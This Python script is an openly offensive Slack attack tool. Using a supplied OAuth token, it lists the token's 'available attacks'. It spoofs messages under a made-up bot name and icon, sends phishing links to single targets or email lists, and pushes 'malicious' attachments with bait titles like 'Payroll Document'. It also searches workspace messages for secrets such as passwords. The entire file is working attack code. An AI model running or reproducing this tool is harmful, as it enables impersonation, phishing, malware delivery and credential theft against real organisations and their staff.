#! /usr/bin/env python3

import os
from slack import WebClient
import argparse

def div():
    print('------------------------------------------')
parse = argparse.ArgumentParser()
# Display help 
parse.add_argument('-t','--token',help='Slack Oauth token',action='store',required=True)
parse.add_argument('-sP','--spoof',help='Spoof a Slack message, customizing your name, icon, etc (Requires -e or -eL)',action='store_true')
parse.add_argument('-m','--message',help='Send a message as the bot associated with your token (Requires -e or -eL)',action='store_true')
parse.add_argument('-s','--search',help='Search slack for secrets with a keyword',action='store_true')
parse.add_argument('-a','--attach',help='Send a message containing a malicious attachment (Requires -f and -e or -eL)',action='store_true')
parse.add_argument('-f','--file',help='Path to file attachment',action='store')
parse.add_argument('-e','--email',help='Email of target',action='store')
parse.add_argument('-eL','--email_list',help='Path to list of emails separated by newline',action='store')
parse.add_argument('-c','--check',help='Lookup and display the permissions and available attacks associated with your provided token.',action='store_true')
args = parse.parse_args()

t = WebClient(args.token)

# List of tokens permissions
perms = []

def token_attacks():
    if 'search:read' in perms:
        print(parse._option_string_actions['-s'].option_strings,parse._option_string_actions['-s'].help)
    if 'chat:write.customize' in perms:
        print(parse._option_string_actions['-sP'].option_strings,parse._option_string_actions['-sP'].help)
    if 'chat:write' in perms:
        print(parse._option_string_actions['-m'].option_strings,parse._option_string_actions['-m'].help)
    if 'files:write' in perms:
        print(parse._option_string_actions['-a'].option_strings,parse._option_string_actions['-a'].help)    
    
def checkperms():
    global perms
    check = t.api_call('auth.test')
    perms = check.headers['x-oauth-scopes'].split(',')
    div()
    print('The permissions for your token are:',perms)
    div()
    print('This token allows the following attacks:')
    token_attacks()

# Check tokens permissions
if args.check == True:
   checkperms()
   exit()
else:
    checkperms()
    

user_id = ""
# lookup userid by email address
def lookupByEmail():
    lookup = t.api_call("users.lookupByEmail?email=" + args.email)
    #print(lookup['user']['id'])
    global user_id
    user_id = lookup['user']['id']

# Send spoofed message
botname,icon,message = '','',''
def setupSpoofMessage():
    global botname,icon,message
    div()
    botname = input('Type the name you\'d like to impersionate\nExample: SecurityBot\n')
    div()
    icon = input('Type the URL to an image you\'d like to use as your profile photo\n')
    div()
    message = input('Type your slack message\nExample: You have been mentioned in <https://google.com|Doc-3972>\n')
    div()
    print('Spoofed name is: ' + botname + '\n'
          'Icon URL: ' + icon + '\n'
          'Slack Message: ' + message + '\n'
        )
    div()
    ready = input('Ready to send your message? y/n\n')
    if ready != 'y':
        exit()
    elif args.email_list != None:
        sendMessageToList()
    else:
        lookupByEmail()
        sendMessage()

# Send non-spoofed message
def setupMessage():
    global botname,icon,message
    div()
    message = input('Type your slack message\nExample: You have been mentioned in <https://google.com|Doc-3972>\n')
    div()
    print(
          'Slack Message: \n' + message 
        )
    div()
    ready = input('Ready to send your message? y/n\n')
    if ready != 'y':
        exit()
    elif args.email_list != None:
        sendMessageToList()
    else:
        lookupByEmail()
        sendMessage()

# Sending to single target
def sendMessage():
    send = t.chat_postMessage(
        channel=user_id,
        username=botname,
        icon_url=icon,
        text=message
        )

# Sending to list of targets
def sendMessageToList():
    r = open(args.email_list)
    for address in r.readlines():
        lookupByEmailList(address)
        sendMessage()
        print("Sending Message to: " + address)
    r.close()

# Lookup slack userid for each email in list
def lookupByEmailList(email_address):
    lookup = t.api_call("users.lookupByEmail?email=" + email_address)
    #print(lookup['user']['id'])
    global user_id
    user_id = lookup['user']['id']    

file_title = ''
def setupFileMessage():
    global message,file_title
    div()
    message = input('Type the slack message to accompany your malicious file\nExample: Please take a look at this report asap!\n')
    div()
    file_title=input('Type the title of your file\nExample: Payroll Document\n')
    div()
    print(
          'Slack Message: ' + message,
          'Title of file: ' + file_title
        )
    div()
    ready = input('Ready to send your message? y/n\n')
    if ready != 'y':
        exit()
    elif args.email_list != None:
        sendFileToList()
    else:
        lookupByEmail()
        sendFile()

def sendFileToList():
    r = open(args.email_list)
    for address in r.readlines():
        lookupByEmailList(address)
        sendFile()
        print("Sending File to: " + address)
    r.close()

def sendFile():
    send = t.files_upload(
    channels=user_id,
    file=args.file,
    title=file_title,
    initial_comment=message,
)

def keywordSearch():
    div()
    keyword = input('Type the keyword you\'d like to search for.\nExample: password\n')
    div()
    search = t.search_messages(
    query = keyword,
    sort = "timestamp",
)
    searchData = search.data['messages']['matches']
    count = len(searchData)
    for data in range(count):
        print(searchData[data]['text'])
    

# Look for arguements
if args.spoof == True:
    if 'chat:write.customize' not in perms:
        div()
        print('ERROR: Your provided token does not have the chat:write.customize permissions.',
              'You can not send a spoofed message'
              )
        exit()
    if args.email == None and args.email_list == None:
        div()
        print('ERROR: -sP/--spoof requires --email or --email_list')
        exit()
    else:
        setupSpoofMessage()
if args.message == True:
    if 'chat:write' not in perms:
        div()
        print('ERROR: Your provided token does not have the chat:write permissions.',
              'You can not send a spoofed message'
              )
        exit()
    if args.email == None and args.email_list == None:
        div()
        print('ERROR: -m/--message requires --email or --email_list')
        exit()
    else:
        setupMessage()
if args.attach == True:
    if 'files:write' not in perms:
        div()
        print('ERROR: Your provided token does not have the files:write permissions.',
              'You can not send a malicious attachment'
              )
        exit()
    if args.email == None and args.email_list == None:
        div()
        print('ERROR: -a/--attach requires --email or --email_list')
        exit()
    else:
        setupFileMessage()
if args.search == True:
    if 'search:read' not in perms:
        div()
        print('ERROR: Your provided token does not have the search:read permissions.',
              'You can not do a keyword search for secrets'
              )
        exit()
    else:
        keywordSearch()
